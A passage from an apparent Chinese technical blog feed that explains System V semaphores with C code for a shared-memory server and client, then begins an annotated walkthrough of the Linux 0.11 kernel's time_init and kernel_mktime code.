cmd, ...)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数：<ul><li>semid：信号量集 id</li><li>semnum：要操作的信号量在信号量集中的编号（从 0 开始递增）</li><li>cmd：设置为 SETVAL 表示为信号量赋值</li><li>可选：第四个参数为联合体 semun</li></ul></li><li>返回值：<ul><li>成功返回非 -1 值</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><p>以下是 semun 联合体的定义，头文件中没有对这个联合体定义，编程时需要自己定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span>              val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>  *<span class="built_in">array</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seminfo</span>  *__<span class="title">buf</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为是赋值，所以只会用到 val 字段，下面给出一个赋值的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span> <span class="title">tmp</span>;</span><span class="comment">// 声明一个 semun 联合体实例</span></span><br><span class="line">tmp.val = <span class="number">2</span>;<span class="comment">// 以下两句表示将信号量集 id 为 semid 的第 1 个信号量赋值为 2</span></span><br><span class="line">semctl(semid, <span class="number">0</span>, SETVAL, tmp);</span><br></pre></td></tr></table></figure><br><blockquote><p>P、V 操作</p></blockquote><p>对信号量的值进行修改（+1 或 -1）使用 semop 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semop</span><span class="params">(<span class="keyword">int</span> semid, struct sembuf *sops, <span class="keyword">unsigned</span> nsops)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数：<ul><li>semid：信号量集 id</li><li>sops：要操作的信号量结构体 sembuf 数组</li><li>nsops：结构体数组的元素个数</li></ul></li><li>返回值：<ul><li>成功返回 0</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><p>sembuf 结构体无需自己定义，semop 头文件中已经定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span>&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> sem_num;</span><br><span class="line"><span class="keyword">short</span>          sem_op;</span><br><span class="line"><span class="keyword">short</span>          sem_flg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>各字段含义：</p><ul><li>sem_num：信号量编号</li><li>sem_op：设置为 1 表示 V 操作，设置为 -1 表示 P 操作</li><li>sem_flg：<ul><li>SEM_UNDO：防止死锁（一般设置为这个）</li><li>IPC_NOWAIT：信号量值为 0 时，P 操作不会阻塞</li></ul></li></ul><br><blockquote><p>销毁信号集</p></blockquote><p>与赋初值一样使用 semctl，不过需要将 cmd 参数的值设置为 IPC_RMID，且第二个参数无意义，一般设置为 0，形如：semctl(semid, 0, IPC_RMID)</p><br><blockquote><p>终端中查看信号量集</p></blockquote><p>在终端中可以通过 <strong>ipcs -s</strong> 指令查看当前存在的信号量集</p><p>也可以通过 <strong>ipcrm -s + 对应 semid</strong> 来删除指定的信号量集</p><br><blockquote><p>代码实现</p></blockquote><p>使用共享内存的代码框架，这次用信号量实现读写同步，头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shmWithSemaphore.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSEMS 2<span class="comment">// 定义信号量的数量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHMSIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATHNAME <span class="meta-string">&quot;./shmTmp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> semId;<span class="comment">// semId 也定义为全局变量</span></span><br><span class="line"><span class="keyword">int</span> shmId;</span><br><span class="line"><span class="keyword">void</span> *shmAddr;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteSemaphore</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该结构体用于初始化信号集</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> *<span class="built_in">array</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seminfo</span> *__<span class="title">buf</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">semun</span> <span class="title">semUn</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印错误的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printError</span><span class="params">(<span class="keyword">char</span> *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(error);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务器端按下 Ctrl+C 时删除临时文件、关闭映射、销毁共享内存、销毁信号集</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serverRemoveSharedMemory</span><span class="params">(<span class="keyword">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">remove(PATHNAME);</span><br><span class="line">shmdt(shmAddr);</span><br><span class="line">shmctl(shmId, IPC_RMID, <span class="literal">NULL</span>);</span><br><span class="line">semctl(semId, <span class="number">0</span>, IPC_RMID);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端按下 Ctrl+C 时关闭映射、销毁共享内存</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clientRemoveSharedMemory</span><span class="params">(<span class="keyword">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">shmdt(shmAddr);</span><br><span class="line">shmctl(shmId, IPC_RMID, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建/获取共享内存 id</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createSharedMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(PATHNAME, O_RDWR|O_CREAT, <span class="number">0664</span>);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Create Tmp File Failed&quot;</span>);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">key_t</span> key = ftok(PATHNAME, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="keyword">int</span> shmId = shmget(key, SHMSIZE, <span class="number">0664</span>|IPC_CREAT);</span><br><span class="line"><span class="keyword">if</span>(shmId == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Create/Get Shared Memory Failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> shmId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建/获取信号量集 id</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createSemaphore</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">key_t</span> key = ftok(PATHNAME, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">int</span> semId = semget(key, NSEMS, <span class="number">0664</span>|IPC_CREAT);</span><br><span class="line"><span class="keyword">if</span>(semId == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Create/Get Semaphore Failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> semId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据 buf 数组初始化信号量集</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initSemaphore</span><span class="params">(<span class="keyword">int</span> buf[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, ret;</span><br><span class="line">semUn tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; NSEMS ; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp.val = buf[i];</span><br><span class="line">ret = semctl(semId, i, SETVAL, tmp);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Init Semaphore Failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// P 操作，参数 buf 为需要操作的信号量编号数组，length 为数组长度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(<span class="keyword">int</span> buf[], <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">semBuf</span>[<span class="title">length</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; length ; i++)</span><br><span class="line">&#123;</span><br><span class="line">semBuf[i].sem_num = buf[i];</span><br><span class="line">semBuf[i].sem_op = <span class="number">-1</span>;</span><br><span class="line">semBuf[i].sem_flg = SEM_UNDO;</span><br><span class="line">&#125;</span><br><span class="line">ret = semop(semId, semBuf, length);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Operation P Failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// V 操作，与 P 操作函数唯一不同在于 sem_op 设置的值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(<span class="keyword">int</span> buf[], <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">semBuf</span>[<span class="title">length</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; length ; i++)</span><br><span class="line">&#123;</span><br><span class="line">semBuf[i].sem_num = buf[i];</span><br><span class="line">semBuf[i].sem_op = <span class="number">1</span>;</span><br><span class="line">semBuf[i].sem_flg = SEM_UNDO;</span><br><span class="line">&#125;</span><br><span class="line">ret = semop(semId, semBuf, length);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Operation V Failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器端使用信号量 0 控制写操作的完成，客户端使用信号量 1 控制写操作的完成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务器端代码</span></span><br><span class="line"><span class="comment">// gcc shmWithSemaphore1.c -o s1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;shmWithSemaphore.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[SHMSIZE];</span><br><span class="line"><span class="keyword">int</span> initBuf[NSEMS] = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;<span class="comment">// 由服务器初始化信号量</span></span><br><span class="line"></span><br><span class="line">shmId = createSharedMemory();</span><br><span class="line">shmAddr = shmat(shmId, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">semId = createSemaphore();<span class="comment">// 创建/获取信号集 id</span></span><br><span class="line">initSemaphore(initBuf);<span class="comment">// 初始化信号量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 子进程用于接收数据</span></span><br><span class="line"><span class="keyword">int</span> pBuf[<span class="number">1</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">P(pBuf, <span class="number">1</span>);<span class="comment">// 等待信号量 1 的释放(即客户端写完)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Server recv: %s&quot;</span>, (<span class="keyword">char</span> *)shmAddr);</span><br><span class="line"><span class="built_in">memset</span>(shmAddr, <span class="number">0</span>, SHMSIZE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 父进程用于写数据</span></span><br><span class="line"><span class="keyword">int</span> vBuf[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">signal(SIGINT, serverRemoveSharedMemory);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">memcpy</span>(shmAddr, buf, SHMSIZE);</span><br><span class="line">V(vBuf, <span class="number">1</span>);<span class="comment">// 服务器端写完，释放信号量 0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc shmWithSemaphore2.c -o s2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;shmWithSemaphore.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[SHMSIZE];</span><br><span class="line"></span><br><span class="line">shmId = createSharedMemory();</span><br><span class="line">shmAddr = shmat(shmId, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">semId = createSemaphore();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 子进程用于接收数据</span></span><br><span class="line"><span class="keyword">int</span> pBuf[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">P(pBuf, <span class="number">1</span>);<span class="comment">// 等待信号量 0 的释放(即服务器端写完)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client recv: %s&quot;</span>, (<span class="keyword">char</span> *)shmAddr);</span><br><span class="line"><span class="built_in">memset</span>(shmAddr, <span class="number">0</span>, SHMSIZE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 父进程用于写数据</span></span><br><span class="line"><span class="keyword">int</span> vBuf[<span class="number">1</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">signal(SIGINT, clientRemoveSharedMemory);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">memcpy</span>(shmAddr, buf, SHMSIZE);</span><br><span class="line">V(vBuf, <span class="number">1</span>);<span class="comment">// 客户端写完，释放信号量 1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读-kernel（二）</title>
      <link href="/2020/03/30/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/03/30/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这一部分来看 main 中调用的 time_init 与 sched_init 函数。</p><p>首先是 time_init，其定义在 main.c 第 76 行，CMOS_READ 与 BCD_TO_BIN 在 main.c 的注释里已经提及，该函数在最后调用了 kernel_mktime 来计算从 1970 年 1 月 1 日 0 时至现在的开机时间，kernel_mktime 定义在 kernel/mktime.c 中</p><h2 id="mktime-c"><a href="#mktime-c" class="headerlink" title="mktime.c"></a>mktime.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span><span class="comment">// 该头文件定义了关于时间的 tm 结构体</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINUTE 60<span class="comment">// 定义一分钟 60 秒，一个小时 60 分钟</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOUR (60*MINUTE)<span class="comment">// 一天 24 小时，一年 365 天</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DAY (24*HOUR)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YEAR (365*DAY)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> month[<span class="number">12</span>] = &#123;<span class="comment">// 该数组成员是每个月 1 号前过了多少秒</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">DAY*(<span class="number">31</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>),<span class="comment">// 先假设是闰年，2 月按 29 天来算</span></span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">30</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">31</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">31</span>+<span class="number">30</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>),</span><br><span class="line">DAY*(<span class="number">31</span>+<span class="number">29</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">31</span>+<span class="number">30</span>+<span class="number">31</span>+<span class="number">30</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">kernel_mktime</span><span class="params">(struct tm * tm)</span><span class="comment">// 返回自 1970 年 1 月 1 日 0 时至今的时间(s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> res;</span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line"><span class="keyword">if</span> (tm-&gt;tm_year &lt; <span class="number">70</span> ) tm-&gt;tm_year += <span class="number">100</span>;<span class="comment">// 1970 年以下的年份不考虑，考虑 2000 年以上</span></span><br><span class="line">year = tm-&gt;tm_year - <span class="number">70</span>;<span class="comment">// 年份减去 70</span></span><br><span class="line"><span class="comment">// (year+1)/4 计算经过了多少个闰年，乘 DAY 表示所有闰年多的那一天的总秒数</span></span><br><span class="line">res = YEAR*year + DAY*((year+<span class="number">1</span>)/<span class="number">4</span>);</span><br><span class="line">res += month[tm-&gt;tm_mon];<span class="comment">// 加上当前月份 1 号前过的秒数</span></span><br><span class="line"><span class="keyword">if</span> (tm-&gt;tm_mon&gt;<span class="number">1</span> &amp;&amp; ((year+<span class="number">2</span>)%<span class="number">4</span>))<span class="comment">// 如果不是闰年且是 3 月以上，需要减去多算的那一天</span></span><br><span class="line">res -= DAY;</span><br><span class="line">res 